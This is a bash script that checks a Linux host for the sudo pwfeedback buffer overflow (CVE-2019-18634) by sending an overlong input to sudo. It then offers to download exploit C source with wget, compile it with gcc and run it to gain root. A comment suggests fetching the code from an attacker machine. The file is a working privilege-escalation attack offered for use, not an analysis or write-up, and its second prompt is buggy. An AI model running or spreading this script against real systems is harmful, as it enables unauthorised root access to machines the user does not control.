#!/bin/bash
#make sure to use lowercase or change the script to use both lower and upper

perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id 
echo ""
read -p "Is there a segmentation fault? (Y/N): " answer
if [ $answer = y ] ; then
	echo "Host is vulernable to Sudo BufferOverflow"
	read -p "Exploit? (Y/N)"
	if [ $answer = y ] ; then
		#if host is not connected to internet you may need to change the below to your attacker machine http address
		wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
		#if host does not have GCC installed will not work
		gcc exploit.c -o exploit
		chmod +x exploit
		./exploit
	elif [ $answer = n ] ; then
		echo "Not exploiting"
	fi
else
	echo "Host not vulnerable"
fi
